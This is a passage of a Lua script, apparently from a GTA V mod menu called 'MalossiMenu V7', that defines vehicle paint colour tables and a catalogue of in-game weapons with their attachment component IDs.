    {name = '~h~Frost White', id = 112}
}
local bi = '~u~MalossiMenu ~s~V7'
local bj = {
    {name = '~h~Black', id = 12},
    {name = '~h~Gray', id = 13},
    {name = '~h~Light Gray', id = 14},
    {name = '~h~Ice White', id = 131},
    {name = '~h~Blue', id = 83},
    {name = '~h~Dark Blue', id = 82},
    {name = '~h~Midnight Blue', id = 84},
    {name = '~h~Midnight Purple', id = 149},
    {name = '~h~Schafter Purple', id = 148},
    {name = '~h~Red', id = 39},
    {name = '~h~Dark Red', id = 40},
    {name = '~h~Orange', id = 41},
    {name = '~h~Yellow', id = 42},
    {name = '~h~Lime Green', id = 55},
    {name = '~h~Green', id = 128},
    {name = '~h~Forest Green', id = 151},
    {name = '~h~Foliage Green', id = 155},
    {name = '~h~Olive Darb', id = 152},
    {name = '~h~Dark Earth', id = 153},
    {name = '~h~Desert Tan', id = 154}
}
local bk = {
    {name = '~h~Brushed Steel', id = 117},
    {name = '~h~Brushed Black Steel', id = 118},
    {name = '~h~Brushed Aluminum', id = 119},
    {name = '~h~Pure Gold', id = 158},
    {name = '~h~Brushed Gold', id = 159}
}

local b0 = {
    Melee = {
        BaseballBat = {
            id = 'weapon_bat',
            name = '~h~~r~> ~s~Baseball Bat',
            bInfAmmo = false,
            mods = {}
        },
        BrokenBottle = {
            id = 'weapon_bottle',
            name = '~h~~r~> ~s~Broken Bottle',
            bInfAmmo = false,
            mods = {}
        },
        Crowbar = {
            id = 'weapon_Crowbar',
            name = '~h~~r~> ~s~Crowbar',
            bInfAmmo = false,
            mods = {}
        },
        Flashlight = {
            id = 'weapon_flashlight',
            name = '~h~~r~> ~s~Flashlight',
            bInfAmmo = false,
            mods = {}
        },
        GolfClub = {
            id = 'weapon_golfclub',
            name = '~h~~r~> ~s~Golf Club',
            bInfAmmo = false,
            mods = {}
        },
        BrassKnuckles = {
            id = 'weapon_knuckle',
            name = '~h~~r~> ~s~Brass Knuckles',
            bInfAmmo = false,
            mods = {}
        },
        Knife = {
            id = 'weapon_knife',
            name = '~h~~r~> ~s~Knife',
            bInfAmmo = false,
            mods = {}
        },
        Machete = {
            id = 'weapon_machete',
            name = '~h~~r~> ~s~Machete',
            bInfAmmo = false,
            mods = {}
        },
        Switchblade = {
            id = 'weapon_switchblade',
            name = '~h~~r~> ~s~Switchblade',
            bInfAmmo = false,
            mods = {}
        },
        Nightstick = {
            id = 'weapon_nightstick',
            name = '~h~~r~> ~s~Nightstick',
            bInfAmmo = false,
            mods = {}
        },
        BattleAxe = {
            id = 'weapon_battleaxe',
            name = '~h~~r~> ~s~Battle Axe',
            bInfAmmo = false,
            mods = {}
        }
    },
    Handguns = {
        Pistol = {
            id = 'weapon_pistol',
            name = '~h~~r~> ~s~Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_PISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        PistolMK2 = {
            id = 'weapon_pistol_mk2',
            name = '~h~~r~> ~s~Pistol MK 2',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_PISTOL_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Mounted Scope',
                        id = 'COMPONENT_AT_PI_RAIL'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Compensator',
                        id = 'COMPONENT_AT_PI_COMP'
                    },
                    {
                        name = '~h~~r~> ~s~Suppessor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        CombatPistol = {
            id = 'weapon_combatpistol',
            name = '~h~Combat Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        APPistol = {
            id = 'weapon_appistol',
            name = 'AP Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_APPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_APPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        StunGun = {
            id = 'weapon_stungun',
            name = '~h~~r~> ~s~Stun Gun',
            bInfAmmo = false,
            mods = {}
        },
        Pistol50 = {
            id = 'weapon_pistol50',
            name = '~h~~r~> ~s~Pistol .50',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_PISTOL50_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_PISTOL50_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        SNSPistol = {
            id = 'weapon_snspistol',
            name = '~h~~r~> ~s~SNS Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SNSPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SNSPISTOL_CLIP_02'
                    }
                }
            }
        },
        SNSPistolMkII = {
            id = 'weapon_snspistol_mk2',
            name = '~h~~r~> ~s~SNS Pistol Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_SNSPISTOL_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Mounted Scope',
                        id = 'COMPONENT_AT_PI_RAIL_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH_03'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Compensator',
                        id = 'COMPONENT_AT_PI_COMP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP_02'
                    }
                }
            }
        },
        HeavyPistol = {
            id = 'weapon_heavypistol',
            name = '~h~~r~> ~s~Heavy Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_HEAVYPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_HEAVYPISTOL_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        VintagePistol = {
            id = 'weapon_vintagepistol',
            name = '~h~~r~> ~s~Vintage Pistol',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_VINTAGEPISTOL_CLIP_02'
                    }
                },
                BarrelAttachments = {
                    {'Suppressor', id = 'COMPONENT_AT_PI_SUPP'}
                }
            }
        },
        FlareGun = {
            id = 'weapon_flaregun',
            name = '~h~~r~> ~s~Flare Gun',
            bInfAmmo = false,
            mods = {}
        },
        MarksmanPistol = {
            id = 'weapon_marksmanpistol',
            name = '~h~~r~> ~s~Marksman Pistol',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolver = {
            id = 'weapon_revolver',
            name = '~h~~r~> ~s~Heavy Revolver',
            bInfAmmo = false,
            mods = {}
        },
        HeavyRevolverMkII = {
            id = 'weapon_revolver_mk2',
            name = '~h~~r~> ~s~Heavy Revolver Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_REVOLVER_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Compensator',
                        id = 'COMPONENT_AT_PI_COMP_03'
                    }
                }
            }
        },
        DoubleActionRevolver = {
            id = 'weapon_doubleaction',
            name = '~h~~r~> ~s~Double Action Revolver',
            bInfAmmo = false,
            mods = {}
        },
        UpnAtomizer = {
            id = 'weapon_raypistol',
            name = '~h~~r~> ~s~Up-n-Atomizer',
            bInfAmmo = false,
            mods = {}
        }
    },
    SMG = {
        MicroSMG = {
            id = 'weapon_microsmg',
            name = '~h~~r~> ~s~Micro SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MICROSMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MICROSMG_CLIP_02'
                    }
                },
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO'}
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_PI_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        SMG = {
            id = 'weapon_smg',
            name = '~h~~r~> ~s~SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SMG_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_SMG_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        SMGMkII = {
            id = 'weapon_smg_mk2',
            name = '~h~~r~> ~s~SMG Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_SMG_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_SMG_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_SMG_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS_SMG'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_SMG_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_SB_BARREL_01'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy',
                        id = 'COMPONENT_AT_SB_BARREL_02'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                }
            }
        },
        AssaultSMG = {
            id = 'weapon_assaultsmg',
            name = '~h~~r~> ~s~Assault SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTSMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTSMG_CLIP_02'
                    }
                },
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO'}
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                }
            }
        },
        CombatPDW = {
            id = 'weapon_combatpdw',
            name = '~h~~r~> ~s~Combat PDW',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_COMBATPDW_CLIP_03'
                    }
                },
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_SMALL'}
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        MachinePistol = {
            id = 'weapon_machinepistol',
            name = '~h~~r~> ~s~Machine Pistol ',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_MACHINEPISTOL_CLIP_03'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_PI_SUPP'
                    }
                }
            }
        },
        MiniSMG = {
            id = 'weapon_minismg',
            name = '~h~~r~> ~s~Mini SMG',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_MINISMG_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_MINISMG_CLIP_02'
                    }
                }
            }
        },
        UnholyHellbringer = {
            id = 'weapon_raycarbine',
            name = '~h~~r~> ~s~Unholy Hellbringer',
            bInfAmmo = false,
            mods = {}
        }
    },
    Shotguns = {
        PumpShotgun = {
            id = 'weapon_pumpshotgun',
            name = '~h~~r~> ~s~Pump Shotgun',
            bInfAmmo = false,
            mods = {
                Flashlight = {
                    {'name = Flashlight', id = 'COMPONENT_AT_AR_FLSH'}
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP'
                    }
                }
            }
        },
        PumpShotgunMkII = {
            id = 'weapon_pumpshotgun_mk2',
            name = '~h~~r~> ~s~Pump Shotgun Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Dragon Breath Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Steel Buckshot Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~Flechette Shells',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT'
                    },
                    {
                        name = '~h~~r~> ~s~Explosive Slugs',
                        id = 'COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Medium Scope',
                        id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_SR_SUPP_03'
                    },
                    {
                        name = '~h~~r~> ~s~Squared Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_08'
                    }
                }
            }
        },
        SawedOffShotgun = {
            id = 'weapon_sawnoffshotgun',
            name = '~h~~r~> ~s~Sawed-Off Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        AssaultShotgun = {
            id = 'weapon_assaultshotgun',
            name = '~h~~r~> ~s~Assault Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTSHOTGUN_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        BullpupShotgun = {
            id = 'weapon_bullpupshotgun',
            name = '~h~~r~> ~s~Bullpup Shotgun',
            bInfAmmo = false,
            mods = {
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        Musket = {
            id = 'weapon_musket',
            name = '~h~~r~> ~s~Musket',
            bInfAmmo = false,
            mods = {}
        },
        HeavyShotgun = {
            id = 'weapon_heavyshotgun',
            name = '~h~~r~> ~s~Heavy Shotgun',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_HEAVYSHOTGUN_CLIP_02'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        DoubleBarrelShotgun = {
            id = 'weapon_dbshotgun',
            name = '~h~~r~> ~s~Double Barrel Shotgun',
            bInfAmmo = false,
            mods = {}
        },
        SweeperShotgun = {
            id = 'weapon_autoshotgun',
            name = '~h~~r~> ~s~Sweeper Shotgun',
            bInfAmmo = false,
            mods = {}
        }
    },
    AssaultRifles = {
        AssaultRifle = {
            id = 'weapon_assaultrifle',
            name = '~h~~r~> ~s~Assault Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Drum Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_CLIP_03'
                    }
                },
                Sights = {
                    {name = '~h~~r~> ~s~Scope', id = 'COMPONENT_AT_SCOPE_MACRO'}
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP'}
                }
            }
        },
        AssaultRifleMkII = {
            id = 'weapon_assaultrifle_mk2',
            name = '~h~~r~> ~s~Assault Rifle Mk II',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Tracer Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER'
                    },
                    {
                        name = '~h~~r~> ~s~Incendiary Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY'
                    },
                    {
                        name = '~h~~r~> ~s~Hollow Point Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING'
                    },
                    {
                        name = '~h~~r~> ~s~FMJ Rounds',
                        id = 'COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Holograhpic Sight',
                        id = 'COMPONENT_AT_SIGHTS'
                    },
                    {
                        name = '~h~~r~> ~s~Small Scope',
                        id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                    },
                    {
                        name = '~h~~r~> ~s~Large Scope',
                        id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                    }
                },
                Flashlight = {
                    {
                        name = '~h~~r~> ~s~Flashlight',
                        id = 'COMPONENT_AT_AR_FLSH'
                    }
                },
                Barrel = {
                    {
                        name = '~h~~r~> ~s~Default',
                        id = 'COMPONENT_AT_AR_BARREL_01'
                    },
                    {name = '~h~~r~> ~s~Heavy', id = 'COMPONENT_AT_AR_BARREL_0'}
                },
                BarrelAttachments = {
                    {
                        name = '~h~~r~> ~s~Suppressor',
                        id = 'COMPONENT_AT_AR_SUPP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Flat Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_01'
                    },
                    {
                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_02'
                    },
                    {
                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_03'
                    },
                    {
                        name = '~h~~r~> ~s~Precision Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_04'
                    },
                    {
                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_05'
                    },
                    {
                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_06'
                    },
                    {
                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
                        id = 'COMPONENT_AT_MUZZLE_07'
                    }
                },
                Grips = {
                    {name = '~h~~r~> ~s~Grip', id = 'COMPONENT_AT_AR_AFGRIP_02'}
                }
            }
        },
        CarbineRifle = {
            id = 'weapon_carbinerifle',
            name = '~h~~r~> ~s~Carbine Rifle',
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {
                        name = '~h~~r~> ~s~Default Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_01'
                    },
                    {
                        name = '~h~~r~> ~s~Extended Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_02'
                    },
                    {
                        name = '~h~~r~> ~s~Box Magazine',
                        id = 'COMPONENT_CARBINERIFLE_CLIP_03'
                    }
                },
                Sights = {
                    {
                        name = '~h~~r~> ~s~Scope',
